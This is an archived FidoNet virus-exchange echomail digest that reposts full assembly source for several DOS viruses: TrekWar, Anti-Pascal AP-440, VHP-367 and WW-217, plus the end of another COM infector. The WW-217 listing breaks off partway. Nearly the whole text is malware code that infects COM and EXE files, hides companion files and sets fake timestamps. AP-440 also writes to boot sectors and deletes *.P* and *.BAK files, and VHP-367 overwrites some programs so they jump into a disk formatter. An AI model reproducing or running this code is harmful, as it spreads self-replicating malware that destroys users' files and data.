    LEA DX,DB0297       ; Directory pathname (this is past the end)
    INT 21H         ; DOS service
    MOV AH,4EH          ; Find first file function
    MOV CX,0011H        ; Find directory and read-only
    LEA DX,DB0292       ; Path '*'
    INT 21H         ; DOS service
    JB  BP0139          ; Branch if error
    JMP BP0179          ; Find a COM file

BP01A0: MOV AH,4FH          ; Find next file function
    INT 21H         ; DOS service
    JB  BP0189          ; Branch if error
    JMP BP01A9          ; Process COM file

    ; Process COM file

BP01A9: MOV AH,3DH          ; Open handle function
    MOV AL,2            ; R/W access
    MOV DX,009EH        ; File pathname
    INT 21H         ; DOS service
    MOV BX,AX           ; Move handle
    MOV AH,3FH          ; Read handle function
    MOV CX,VIRLEN       ; Length of virus
    NOP
    MOV DX,OFFSET DWE000    ; Read it in way down there
    NOP
    INT 21H         ; DOS service
    MOV AH,3EH          ; Close handle function
    INT 21H         ; DOS service
    MOV BX,DWE000       ; Get first word of COM file
    CMP BX,9600H        ; Is it infected? (should be 0096H)
    JZ  BP01A0          ; Yes, find another one
    MOV AH,43H          ; \ Get file attributes function
    MOV AL,0            ; /
    MOV DX,009EH        ; File pathname
    INT 21H         ; DOS service
    MOV AH,43H          ; \ Set file attributes function
    MOV AL,1            ; /
    AND CX,00FEH        ; Set off read only attribute
    INT 21H         ; DOS service
    MOV AH,3DH          ; Open handle function
    MOV AL,2            ; R/W mode
    MOV DX,009EH        ; File pathname
    INT 21H         ; DOS service
    MOV BX,AX           ; Move handle
    MOV AH,57H          ; \ Get file date & time function
    MOV AL,0            ; /
    INT 21H         ; DOS service
    PUSH    CX
    PUSH    DX
    ASSUME  ES:NOTHING
    MOV DX,CS:DW0295        ; Get word after virus here
    MOV CS:DWE195,DX        ; Move to same position in prog
    MOV DX,CS:DWE000+1      ; Get displacement from initial jump
    LEA CX,DB0294-100H      ; Length of virus minus one
    SUB DX,CX
    MOV CS:DW0295,DX        ; Store in word after virus
    MOV AH,40H          ; Write handle function
    MOV CX,VIRLEN       ; Length of virus
    NOP
    LEA DX,START        ; Beginning of virus
    INT 21H         ; DOS service
    MOV AH,57H          ; \ Set file date & time function
    MOV AL,1            ; /
    POP DX
    POP CX
    INT 21H         ; DOS service
    MOV AH,3EH          ; Close handle function
    INT 21H         ; DOS service
    MOV DX,CS:DWE195        ; Get word after virus
    MOV CS:DW0295,DX        ; Move to same position here
    JMP BP0234

BP0234: MOV AH,0EH          ; Select disk function
    MOV DL,CS:DB0249        ; Get current disk
    INT 21H         ; DOS service
    MOV AH,3BH          ; Change current directory function
    LEA DX,DB024A       ; Address of path - this is incorrect
    INT 21H         ; DOS service
    MOV AH,0            ; Terminate program function
    INT 21H         ; DOS service

DB0249  DB  2           ; Current disk
DB024A  DB  0           ; New current drive

    ; There should be an extra byte at this point containing '\'
    ; for use by the change directory function - this is why that
    ; function is pointing at the previous field

DB024B  DB  'TEST', 3CH DUP (0)
DB028B  DB  0DH         ; Number of drives
DB028C  DB  '*.COM', 0
DB0292  DB  '*', 0
DB0294  DB  0E9H

ENDADR  EQU $

CODE    ENDS

    END START

-+-  FidoPCB v1.4 [NR]
 + Origin: FidoNet * Mathieu NotВris * Brussels-Belgium-Europe (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    ■ The Me┬eO

/uxxxx        Set version emulation, version xxxx

--- Aidstest Null: /Kill
 * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)
SEEN-BY: 463/707 465/1 10 11 23 46 57 60 666 4651/1 4653/1 4657/3 5020/52
SEEN-BY: 5020/221 5030/48 84 96 136 170 179
.PATH: 5030/136 465/10 23

─ [19] Вирусы... (2:465/666) ─────────────────────────────────────── PVT.VIRII ─
 Msg  : 76 of 90                                                                
 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:16 
 To   : -  *.*  -                                                               
 Subj : TREKWAR.ASM                                                             
────────────────────────────────────────────────────────────────────────────────
.MSGID: 2:5030/136 2cdf6040
.PID: 3DS 3.0 [Reg]
.RealName: Max Ivanov
═══════════════════════════════════════════════════════════════════════════════
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: Инфоpмация о виpусах)
* From : Mike Salvino, 2:283/718 (06 Nov 94 17:51)
* To   : Daniel Hendry
* Subj : TREKWAR.ASM
═══════════════════════════════════════════════════════════════════════════════
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
18.n283!not-for-mail
@RFC-Return-Receipt-To: Mike.Salvino@f718.n283.z2.fidonet.org
;TrekWar
;┌───────────────────────────────────────────────────────────────────────────┐
;│  Assembly Source Listing for TrekWar Companion Virus                      │
;│  Copyright (c) 1993  T.R.E.K.  All Rights Reserved. :)                    │
;├───────────────────────────────────────────────────────────────────────────┤
;│ The TrekWar is a simple modification of the Clonewar V2 companion virus;  │
;│ for all you trekkers out there... For those of you who, heaven forbid, do │
;│ not know what the words below mean, they are the words to the old series  │
;│ opening music of Star Trek...                                             │
;└───────────────────────────────────────────────────────────────────────────┘

CSEG            SEGMENT
                ASSUME  CS:CSEG,DS:NOTHING

                ORG   100H

START:
                jmp  VIR_BEGIN         ;lets get moving...

                db  "",13,10
                db  "",13,10
                db  "Beyond",13,10                           ;blah blah blah
                db  "The rim of the star-light",13,10
                db  "My love",13,10
                db  "Is wand'ring in star-flight",13,10
                db  "I know",13,10
                db  "He'll find in star-clustered reaches",13,10
                db  "Love",13,10
                db  "Strange love a star woman teaches.",13,10
                db  "I know",13,10
                db  "His journey ends never",13,10
                db  "His star trek",13,10
                db  "Will go on forever.",13,10
                db  "But tell him",13,10
                db  "While he wanders his starry sea",13,10
                db  "Remember, remember me."
                db  "",13,10
                db  "",13,10

                db  "[TrekWar]  "      ;what the heck, its only a few bytes!?
WILDCARD        DB  "*.EXE",0
FILE_EXT        DB  "COM",0
FILE_FOUND      DB  12 DUP(' '), 0
FILE_CREATE     DB  12 DUP(' '), 0
SEARCH_ATTRIB   DW  17H
NUM_INFECT      DW  0


My_Cmd:
CMD_LEN         DB  13
FILE_CLONE      DB  12 DUP (' '), 0

;─────────────────────────────────────────────────────────────────────
; Read all the directory filenames and store as records in buffer.
;─────────────────────────────────────────────────────────────────────

Vir_begin:

           mov    sp,offset STACK_HERE   ;move stack down
           mov    bx,sp
           add    bx,15
           mov    cl,4
           shr    bx,cl
               mov    ah,4ah                 ;deallocate rest of memory
           int    21h

           mov    di,OFFSET FILE_CLONE   ;Point to buffer.
           mov    si,OFFSET FILE_FOUND
           mov    cx,12
           rep    movsb

Read_dir:      mov    dx,OFFSET WILDCARD     ;file mask for directory search
           mov    cx,SEARCH_ATTRIB

               mov    ah,4Eh                 ;find first matching file
           int    21h

               jc     EXIT                   ;If empty directory, exit

;────────────────────────────────────────────────────────────────────────

Store_name:

           mov    di,OFFSET FILE_FOUND   ;Point to buffer.
           mov    si,158                 ;stow the file found in buffer
           mov    cx,12
           rep movsb

           mov    di,OFFSET FILE_CREATE  ;Point to buffer.
           mov    si,158
           mov    cx,12
           rep movsb

           cld
           mov    di,OFFSET FILE_CREATE
           mov    al,'.'
           mov    cx,9
           repne scasb                   ;find the '.'

           mov    si,OFFSET FILE_EXT
           mov    cx,3
           rep movsb                     ;replace the .EXE with .COM
                         ;from buffer

;─────────────────────────────────────────────────────────────────────

Check_file:                                  ;does the file exist?
           mov    dx,OFFSET FILE_CREATE
               xor    cx,cx
               mov    ax,3d00h               ;Open file, read only
           int    21h
               jnc    find_next

;──────────────────────────────────────────────────────────────────────
Infect_file:                                 ;create companion routine

               mov    dx,OFFSET FILE_CREATE  ;contains name of "companion"
               xor    cx,cx
               mov    ah,3ch                 ;construct file
           int    21h
           jc     EXIT

                                             ;Write virus to companion file
               xchg   bx,ax
               mov    cx,(OFFSET END_OF_CODE - OFFSET START)  ;virus length
           mov    dx,OFFSET START
               mov    ah,40h                 ;write to file function
               int    21h                    ;do it

                                             ;Close file
               mov    ah,3eh                 ;assumes bx still has file handle
           int    21h

                                             ;Change attributes
               mov    dx,OFFSET FILE_CREATE  ;of created file to
               mov    cx,3                   ;(1) read only and (2) hidden
           mov    ax,4301h
           int    21h
               jmp    prepare_command

;──────────────────────
;...findnext...
;──────────────────────
find_next:
              mov     ah, 4fh                ;find next...
              int     21h
              jmp     store_name
;──────────────────────────────────────────────────────────────────────
Prepare_command:

           cld
           mov    di,OFFSET FILE_CLONE
           mov    al,0
           mov    cx,12
               repne scasb                   ;find the end of string \0

               mov    al,0Dh                 ;<CR>
               stosb                         ;replace \0 with a <CR>

               mov    ax,12                  ;store length of the command
           sub    ax,cx
           mov    CMD_LEN, al

;──────────────────────────────────────────────────────────────────────

Exit:
                                             ;Run the original program
           mov    si, OFFSET MY_CMD
               int    2Eh                    ;Pass command to command
                                             ;interpreter for execution
               mov    ax,4C00H               ;Exit to DOS
           int    21h


END_OF_CODE     =       $

STACK_HERE      EQU   END_OF_CODE + 512

CSEG            ENDS
                END      START

-+-  FMail 0.96т
 + Origin: ViRUS PaRk BbS >916< 387-6159 24HouRs (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    ■ The Me┬eO

/zi,/zd,/zn   Debug info: zi=full, zd=line numbers only, zn=none

--- Aidstest Null: /Kill
 * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)
SEEN-BY: 463/707 465/1 10 11 23 46 57 60 666 4651/1 4653/1 4657/3 5020/52
SEEN-BY: 5020/221 5030/48 84 96 136 170 179
.PATH: 5030/136 465/10 23

─ [19] Вирусы... (2:465/666) ─────────────────────────────────────── PVT.VIRII ─
 Msg  : 77 of 90                                                                
 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:16 
 To   : -  *.*  -                                                               
 Subj : AP_440.ASM                                                              
────────────────────────────────────────────────────────────────────────────────
.MSGID: 2:5030/136 2cdf6046
.PID: 3DS 3.0 [Reg]
.RealName: Max Ivanov
═══════════════════════════════════════════════════════════════════════════════
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: Инфоpмация о виpусах)
* From : Fred Lee, 2:283/718 (06 Nov 94 17:54)
* To   : Mike Nisbett
* Subj : AP_440.ASM
═══════════════════════════════════════════════════════════════════════════════
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
18.n283!not-for-mail
@RFC-Return-Receipt-To: Fred.Lee@f718.n283.z2.fidonet.org
    page    ,132
    name    AP440
    title   The 'Anti-Pascal' virus, version AP-440
    .radix  16

; ╔══════════════════════════════════════════════════════════════════════════╗
; ·  Bulgaria, 1404 Sofia, kv. "Emil Markov", bl. 26, vh. "W", et. 5, ap. 51 ·
; ·  Telephone: Private: +359-2-586261, Office: +359-2-71401 ext. 255        ·
; ·                                      ·
; ·            The 'Anti-Pascal' Virus, version AP-440               ·
; ·         Disassembled by Vesselin Bontchev, July 1990         ·
; ·                                      ·
; ·          Copyright (c) Vesselin Bontchev 1989, 1990          ·
; ·                                      ·
; ·  This listing is only to be made available to virus researchers      ·
; ·        or software writers on a need-to-know basis.          ·
; ╚══════════════════════════════════════════════════════════════════════════╝

; The disassembly has been tested by re-assembly using MASM 5.0.

code    segment
    assume  cs:code, ds:code

    org 100

v_const =   2042d

start:
    jmp v_entry
    db  0CA     ; Virus signature

    db  (2048d - 9) dup (90)

    mov ax,4C00
    int 21

v_start label   byte
first4  db  0E9, 0F8, 7, 90
allcom  db  '*.COM', 0

mydta   label   byte
reserve db  15 dup (?)
attrib  db  ?
time    dw  ?
date    dw  ?
fsize   dd  ?
namez   db  14d dup (?)

allp    db  0, '????????P??'
allbak  db  0, '????????BAK'
maxdrv  db  ?
sign    db  'ICS 89'

v_entry:
    push    ax      ; Save AX & DX
    push    dx

    mov ah,19       ; Get the default drive
    int 21
    push    ax      ; Save it on stack
    mov ah,0E       ; Set it as default (?!)
    mov dl,al
    int 21      ; Do it

    call    self        ; Determine the virus' start address
self:
    pop si
    sub si,offset self-v_const

; Save the number of logical drives in the system:

    mov byte ptr [si+offset maxdrv-v_const],al

; Restore the first 4 bytes of the infected program:

    mov ax,[si+offset first4-v_const]
    mov word ptr ds:[offset start],ax
    mov ax,[si+offset first4+2-v_const]
    mov word ptr ds:[offset start+2],ax

    mov ah,1A       ; Set new DTA
    lea dx,[si+offset mydta-v_const]
    int 21      ; Do it

    pop ax      ; Restore current drive in AL
    push    ax      ; Keep it on stack

    call    inf_drive   ; Proceed with the current drive

    xor al,al       ; For all logical drives in the system
drv_lp:
    call    inf_drive   ; Proceed with drive
    jbe drv_lp      ; Loop until no more drives

    pop ax      ; Restore the saved current drive
    mov ah,0E       ; Set it as current drive
    mov dl,al
    int 21      ; Do it

    mov dx,80       ; Restore original DTA
    mov ah,1A
    int 21      ; Do it

    mov si,offset start
    pop dx      ; Restore DX & AX
    pop ax
    jmp si      ; Run the original program

inf_drive:
    push    ax      ; Save the selected drive number on stack
    mov ah,0E       ; Select that drive
    mov dl,al
    int 21      ; Do ti
    pop ax      ; Restore AX

    push    ax      ; Save the registers used
    push    bx
    push    cx
    push    si      ; Save SI

    mov cx,1        ; Read the boot sector of the drive specified
    xor dx,dx
    lea bx,[si+offset v_end-v_const]
    push    ax      ; Save AX
    push    bx      ; Save BX, CX & DX also
    push    cx
    push    dx
    int 25      ; Do read
    pop dx      ; Clear the stack
    pop dx      ; Restore saved DX, CX & BX
    pop cx
    pop bx
    jc  bad_drv     ; Exit on error

    inc byte ptr [bx]   ; Increment the first byte (?!)
    cmp byte ptr [bx+1],6F  ; Second byte == 111 (?!)
    jne wr_drive    ; Write the new values if not

bad_drv:
    pop ax      ; Restore AX
    pop si      ; Restore SI
drv_xit:
    pop cx      ; Restore used registers
    pop bx
    pop ax

    inc al      ; Go to next drive number
    cmp al,[si+offset maxdrv-v_const]   ; See if there are more drives
    ret         ; Exit

wr_drive:
    pop ax      ; Restore drive number in AL
    int 26      ; Do write
    pop ax      ; Clear the stack
    pop si      ; Restore Si
    jc  drv_xit     ; Exit on error

; Find first COM file on the current directory of the selected drive:

    mov ah,4E
    xor cx,cx       ; Normal files only
    lea dx,[si+offset allcom-v_const]   ; File mask
next:
    int 21      ; Do find
    jc  no_more     ; Quit search if no more such files
    lea dx,[si+offset namez-v_const]    ; Get file name found
    call    infect      ; Infect that file
    mov ah,4F       ; Prepare for FindNext
    jc  next        ; If infection not successful, go to next file
    jmp drv_xit     ; Otherwise quit

no_more:
    lea di,[si+offset v_end-v_const]
    cmp byte ptr [di],'Z'
    jb  drv_xit

    mov ah,13       ; Delete all *.P* files in that dir
    lea dx,[si+offset allp-v_const]
    int 21      ; Do it
    cmp al,-1
    je  drv_xit     ; Exit on error

    mov ah,13       ; Delete all *.BAK files too
    lea dx,[si+offset allbak-v_const]
    int 21      ; Do it

    jmp drv_xit     ; Done. Exit

namaddr dw  ?       ; Address of the file name buffer

infect:
    mov [si+offset namaddr-v_const],dx  ; Save file name address

    mov ax,4301     ; Reset all file attributes
    xor cx,cx
    int 21      ; Do it
    jnc inf_cont    ; Continue if all OK
inf_xit:
    ret         ; Otherwise exit

inf_cont:
    mov ax,3D02     ; Open file for both reading and writing
    int 21
    jc  inf_xit     ; Exit on arror
    mov bx,ax       ; Save file handle in BX

    mov cx,4        ; Read the first 4 bytes of the file
    mov ah,3F
    lea di,[si+offset first4-v_const]   ; Save them in first4
    mov dx,di
    int 21      ; Do it
    jc  quit        ; Exit on error

    cmp byte ptr [di+3],0CA ; File already infected?
    stc         ; Set CF to indicate it
    jz  quit        ; Don't touch this file if so

    mov cx,[si+offset fsize-v_const]
    cmp cx,2048d    ; Check if file size >= 2048 bytes
    jb  quit        ; Exit if not
    cmp cx,64000d   ; Check if file size <= 64000 bytes
    stc         ; Set CF to indicate it
    ja  quit        ; Exit if not

    xor cx,cx       ; Seek to file end
    xor dx,dx
    mov ax,4202
    int 21      ; Do it
    push    ax      ; Save file size on stack
    jc  quit        ; Exit on error

; Write the virus body after the end of file:

    mov cx,v_end-v_start
    nop
    lea dx,[si+offset v_start-v_const]
    mov ah,40
    int 21      ; Do it
    jc  quit        ; Exit on error
    pop ax      ; Restore file size in AX

; Form a new address for the first JMP instruction in AX:

    add ax,v_entry-v_start-3
    mov byte ptr [di],0E9   ; JMP opcode
    mov [di+1],ax
    mov byte ptr [di+3],0CA ; Set the "file infected" sign

    xor cx,cx       ; Seek to file beginning
    xor dx,dx
    mov ax,4200
    int 21      ; Do it
    jc  quit        ; Exit on error

    mov cx,4        ; Write the new first 4 bytes of the file
    mov dx,di
    mov ah,40
    int 21      ; Do it

quit:
    pushf           ; Save flags

    mov ax,5701     ; Set file date & time
    mov cx,[si+offset time-v_const] ; Get time from mydta
    mov dx,[si+offset date-v_const] ; Get date from mydta
    int 21      ; Do it

    mov ah,3E       ; Close the file
    int 21

    mov ax,4301     ; Set file attributes
    mov cl,[si+offset attrib-v_const]   ; Get them from mydta
    xor ch,ch
    mov dx,[si+offset namaddr-v_const]  ; Point to file name
    int 21      ; Do it

    popf            ; Restore flags
    ret

v_end   equ $

code    ends
    end start

-+-  CrossPoint v3.02
 + Origin: <Rudy's Place - Israel> Hard disks never die... (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    ■ The Me┬eO

/i            Initialize all segments

--- Aidstest Null: /Kill
 * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)
SEEN-BY: 463/707 465/1 10 11 23 46 57 60 666 4651/1 4653/1 4657/3 5020/52
SEEN-BY: 5020/221 5030/48 84 96 136 170 179
.PATH: 5030/136 465/10 23

─ [19] Вирусы... (2:465/666) ─────────────────────────────────────── PVT.VIRII ─
 Msg  : 78 of 90                                                                
 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:17 
 To   : -  *.*  -                                                               
 Subj : V_VHP367.ASM                                                            
────────────────────────────────────────────────────────────────────────────────
.MSGID: 2:5030/136 2cdf6050
.PID: 3DS 3.0 [Reg]
.RealName: Max Ivanov
═══════════════════════════════════════════════════════════════════════════════
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: Инфоpмация о виpусах)
* From : Graham Allen, 2:283/718 (06 Nov 94 17:55)
* To   : Adam Happ
* Subj : V_VHP367.ASM
═══════════════════════════════════════════════════════════════════════════════
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
18.n283!not-for-mail
@RFC-Return-Receipt-To: Graham.Allen@f718.n283.z2.fidonet.org
    page    ,132
    name    VHP_367
    title   Virus; based on the famous VHP-648 virus
    .radix  16

code    segment
    assume  cs:code,ds:code

    org 100

environ equ 2C

newjmp  equ 7Bh     ;Code of jmp instruction
codeptr equ 7A      ;Here is formed a jump to the virus code
pname   equ 78      ;Offset of file name in the dir path
poffs   equ 76      ;Offset in the contents of the `PATH' variable
errhnd  equ 74      ;Save place for the old error handler
fname   equ 70      ;Path name to search for
mydta   equ 2C      ;DTA for Find First/Next:
attrib  equ 17      ;File attribute
time    equ 16      ;File time
date    equ 14      ;File date
fsize   equ 12      ;File size
namez   equ 0E      ;File name found

start:
    jmp short virus
    nop
    int 20

data    label   byte        ;Data section
saveins db  3 dup (90)  ;Original first 3 bytes
allcom  db  '*.COM',0       ;Filespec to search for
pathstr db  'PATH='

;This replaces the first instruction of a destroyed file.
;It's a jmp instruction into the hard disk formatting program (IBM XT only):

bad_jmp db  0EA,6,0,0,0C8

virus:
    mov di,offset start ;Push the program true start address
    push    di      ; onto the stack
    push    ax      ;Save AX

    call    self        ;Detrmine the virus start address
    nop         ;For those looking for the E80000 pattern
self:
    pop bx
    sub bx,self-data-1  ;Keep bx pointed at data
    cld
    lea si,[bx+saveins-data]    ;Original instruction saved there
    movsw           ;Move 2 + 1 bytes
    movsb
    mov si,bx       ;Keep SI pointed at data

    lea bp,[bx+endcode-data+7A] ;Reserve local storage

    mov ax,3524     ;Get interrupt 24h handler
    int 21      ; and save it in errhnd

    mov [bp-errhnd],bx
    mov [bp-errhnd+2],es

    mov ah,25       ;Set interrupt 24h handler
    lea dx,[si+handler-data]
    cmp al,0        ;DOS < 2.0 zeroes AL
    je  exit        ;Exit if version < 2.0
    push    ds
    int 21

    lea dx,[bp-mydta]
    mov ah,1A       ;Set DTA
    int 21

    push    si      ;Save SI
    mov es,ds:[environ] ;Environment address
    xor di,di       ;Point ES:DI at the environment start
    mov bx,si
    mov al,0        ;0 means end of an enveronment variable
search:             ;Search 'PATH' in the environment
    lea si,[bx+pathstr-data]
    mov cx,5        ;5 letters in 'PATH='
    repe    cmpsb
    je  pfound      ;PATH found, continue
    mov ch,80       ;Maximum 32 K in environment
    repne   scasb       ;If not, skip through next 0
    cmp al,es:[di]  ;End of environment?
    jne search      ;If not, retry
    xor di,di       ;0 indicates no PATH found
pfound:
    pop si      ;Restore SI & ES
    pop es

    mov [bp-poffs],di   ;Save 'PATH' offset in poffs
    lea di,[bp-fname]
    mov [bp-pname],di

filesrch:
    lea si,[bx+allcom-data]
    movsw
    movsw           ;Move '*.COM' at fname
    movsw
    mov si,bx       ;Restore SI

    mov ah,4E       ;Find first file
    lea dx,[bp-fname]
    mov cl,11b      ;Hidden, Read/Only or Normal files
    jmp short findfile

checkfile:
    mov al,[bp-time]    ;Check file time
    and al,11111b   ; (the seconds, more exactly)
    cmp al,62d/2    ;Are they 62?

;If so, file is already contains the virus, search for another:

    je  findnext

;Is 10 <= file_size <= 64,000 bytes?

    sub word ptr [bp-fsize],10d
    cmp [bp-fsize],64000d-10d+1
    jc  process     ;If so, process the file

findnext:           ;Otherwise find the next file
    mov ah,4F       ;Find next file
findfile:
    int 21
    jnc checkfile   ;If found, go chech some conditions

nextdir:
    mov si,[bp-poffs]   ;Get the offset in the PATH variable
    or  si,si       ;0 means end of PATH
    jnz skip2

olddta:
    push    ds      ;Save DS
    mov ax,2524     ;Set interrupt 24h handler
    lds dx,dword ptr [bp - errhnd]
    int 21
    pop ds      ;Restore DS

exit:
    mov ah,1A       ;Set DTA
    mov dx,80       ;Restore DTA
    int 21

    pop ax
    ret         ;Go to CS:IP by doing funny RET

skip2:
    push    ds      ;Save DS
    lea di,[bp-fname]   ;Point ES:DI at fname
    mov ds,ds:[environ] ;Point DS:SI at the PATH variable found
cpydir:
    lodsb           ;Get a char from the PATH variable
    cmp al,';'          ;`;' means end of directory
    je  enddir
    cmp al,0        ;0 means end of PATH variable
    je  endpath
    stosb           ;Put the char in fname
    jmp cpydir      ;Loop until done
endpath:
    xor si,si       ;Zero SI to indicate end of PATH
enddir:
    pop ds      ;Restore DS
    mov [bp-poffs],si   ;Save the new offset in the PATH variable
    mov al,'\'          ;Add '\'
    stosb
    mov [bp-pname],di
    jmp filesrch    ;And go find the first *.COM file

process:
    mov di,[bp-pname]
    lea si,[bp-namez]   ;Point SI at namez
cpyname:
    lodsb           ;Copy name found to fname
    stosb
    cmp al,0
    jne cpyname
    mov si,bx       ;Restore SI

    mov ax,4301     ;Set file attributes
    call    clr_cx_dos

    mov ax,3D02     ;Open file with Read/Write access
    int 21
    jc  oldattr     ;Exit on error
    mov bx,ax       ;Save file handle in BX

    mov ah,2C       ;Get system time
    int 21
    and dh,111b     ;Are seconds a multiple of 8?
    jnz infect      ;If not, contaminate file (don't destroy):

;Destroy file by rewriting an illegal JMP as a first instruction:

    mov cx,5        ;Write 5 bytes
    lea dx,[si+bad_jmp-data]    ;Write THESE bytes
    jmp short do_write  ;Do it

;Try to contaminate file:

;Read first instruction of the file (first 3 bytes) and save it in saveins:

infect:
    mov ah,3F       ;Read from file handle
    mov cx,3        ;Read 3 bytes
    lea dx,[si+saveins-data]    ;Put them there
    call    dos_rw
    jc  oldtime     ;Exit on error

;Move file pointer to end of file:

    mov ax,4202     ;LSEEK from end of file
    call    clr_dx_cx_dos

    add ax,virus-data-3 ;Add virus data length to get code offset
    mov [bp-codeptr],ax ;Save result in codeptr

    mov cx,endcode-data ;Virus code length as bytes to be written
    mov dx,si       ;Write from data to endcode
    call    dos_write   ;Write to file handle
    jc  oldtime     ;Exit on error

    call    lseek       ;LSEEK to the beginning of the file

;Rewrite the first instruction of the file with a jump to the virus code:

    mov cl,3        ;3 bytes to write
    lea dx,[bp-newjmp]  ;Write THESE bytes
do_write:
    call    dos_write   ;Write to file handle

oldtime:
    mov dx,[bp-date]    ;Restore file date
    mov cx,[bp-time]    ; and time
    or  cl,11111b   ;Set seconds to 62 (the virus' marker)

    mov ax,5701     ;Set file date & time
    int 21
    mov ah,3E       ;Close file handle
    int 21

oldattr:
    mov ax,4301     ;Set file attributes
    mov cx,[bp-attrib]  ;They were saved in attrib
    and cx,3F
    lea dx,[bp-fname]
    int 21      ;Do it
    jmp olddta      ;And exit

lseek:
    mov ax,4200     ;LSEEK from the beginning of the file
clr_dx_cx_dos:
    xor dx,dx       ;From the very beginning
clr_cx_dos:
    xor cx,cx       ;Auxiliary entry point
    db  3Dh     ;Trick
dos_write:
    mov ah,40       ;Write to file handle
dos_rw:
    int 21
    jc  dos_ret     ;Exit on error
    cmp ax,cx       ;Set CF if AX < CX
dos_ret:
    ret

handler:            ;Critical error handler
    mov al,0        ;Just ignore the error
    iret            ; and return

    db  0E9     ;The JMP opcode

endcode label   byte

code    ends
    end start

-+-  GEcho 1.10+
 + Origin: <Rudy's Place - Israel> Hard disks never die... (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    ■ The Me┬eO

/d            Warn if duplicate symbols in libraries

--- Aidstest Null: /Kill
 * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)
SEEN-BY: 463/707 465/1 10 11 23 46 57 60 666 4651/1 4653/1 4657/3 5020/52
SEEN-BY: 5020/221 5030/48 84 96 136 170 179
.PATH: 5030/136 465/10 23

─ [19] Вирусы... (2:465/666) ─────────────────────────────────────── PVT.VIRII ─
 Msg  : 79 of 90                                                                
 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:17 
 To   : -  *.*  -                                                               
 Subj : WW_217.ASM                                                              
────────────────────────────────────────────────────────────────────────────────
.MSGID: 2:5030/136 2cdf6055
.PID: 3DS 3.0 [Reg]
.RealName: Max Ivanov
═══════════════════════════════════════════════════════════════════════════════
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: Инфоpмация о виpусах)
* From : Graham Allen, 2:283/718 (06 Nov 94 17:55)
* To   : Adam Happ
* Subj : WW_217.ASM
═══════════════════════════════════════════════════════════════════════════════
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
18.n283!not-for-mail
@RFC-Return-Receipt-To: Graham.Allen@f718.n283.z2.fidonet.org
; new virus obtained from Marek Filipiak 1990-10-05
;
; dissasembled by Andrzej Kadlof
;

  0100 E90200         jmp    0105

; 0103 00F0           add    al,dh

;=========================
; virus main entry point

  0105 E8BC00         call   01C4     ; set SI to start of virus code

  0108 56             push   si

; restore main COM file

  0109 81C6D201       add    si,01D2  ; 3 oryginal bytes of victim
  010D BF0001         mov    di,0100
  0110 B90300         mov    cx,0003
  0113 F3A4           rep movsb

  0115 5E             pop    si
  0116 B44E           mov    ah,4E    ; find first
  0118 BAC901         mov    dx,01C9  ; address of *.COM,0 in virus
  011B 01F2           add    dx,si    ; in memory
  011D B9FFFF         mov    cx,FFFF  ; all posible atributes
  0120 CD21           int    21

  0122 723D           jb     0161     ; no more files, return to main file

  0124 52             push   dx
  0125 B8023D         mov    ax,3D02  ; open file for read write
  0128 BA9E00         mov    dx,009E  ; DS:DX ASCIIZ file name
  012B CD21           int    21

  012D 722B           jb     015A     ; error

  012F 8BD8           mov    bx,ax    ; store file handle
  0131 8B0E9C00       mov    cx,[009C]   ; file length in DTA
  0135 8B169A00       mov    dx,[009A]
  0139 83EA02         sub    dx,0002  ; move file pointer back two bytes
  013C B80142         mov    ax,4201
  013F CD21           int    21

  0141 BAD501         mov    dx,01D5  ; buffer in virus body
  0144 01F2           add    dx,si    ; in memory
  0146 B90200         mov    cx,0002  ; number of bytes
  0149 B43F           mov    ah,3F    ; read file
  014B CD21           int    21

  014D 8B84D501       mov    ax,[si+01D5] ; readed 2 bytes
  0151 3D5757         cmp    ax,5757  ; WW virus sygnature
  0154 7510           jne    0166     ; file not infected

  0156 B43E           mov    ah,3E    ; close file
  0158 CD21           int    21

  015A 5A             pop    dx       ; restore DTA
  015B B44F           mov    ah,4F    ; find next
  015D CD21           int    21

  015F 73C3           jnb    0124     ; check file

; return to main file

  0161 BB0001         mov    bx,0100
  0164 FFE3           jmp    bx

;---------------
; infect file

  0166 A19A00         mov    ax,[009A] ; file length
  0169 2D0300         sub    ax,0003   ; starting adres in infected file
  016C 8984D001       mov    [si+01D0],ax ; form JMP nnnn instruction
  0170 E83E00         call   01B1      ; move file pointer at the beginning

  0173 BAD201         mov    dx,01D2   ; buffer for first 3 bytes of victim
  0176 01F2           add    dx,si     ; in memory
  0178 B90300         mov    cx,0003   ; number of bytes
  017B B43F           mov    ah,3F     ; read file
  017D CD21           int    21

  017F E82F00         call   01B1      ; move file pointer at the begining

  0182 BACF01         mov    dx,01CF   ; address of new starting bytes
  0185 01F2           add    dx,si     ; in memory
  0187 B90300         mov    cx,0003   ; number of bytes
  018A B440           mov    ah,40     ; write to file
  018C CD21           int    21

  018E E82500         call   01B6      ; move file pointer at the end of file

  0191 8BD6           mov    dx,si
  0193 81C20001       add    dx,0100   ; virus code in memory
  0197 B9D900         mov    cx,00D9   ; virus length
  019A B440           mov    ah,40     ; write to file
  019C CD21           int    21

  019E B80157         mov    ax,5701   ; set time/date file stamp
  01A1 8B0E9600       mov    cx,[0096] ; restore from DTA
  01A5 8B169800       mov    dx,[0098]
  01A9 CD21           int    21

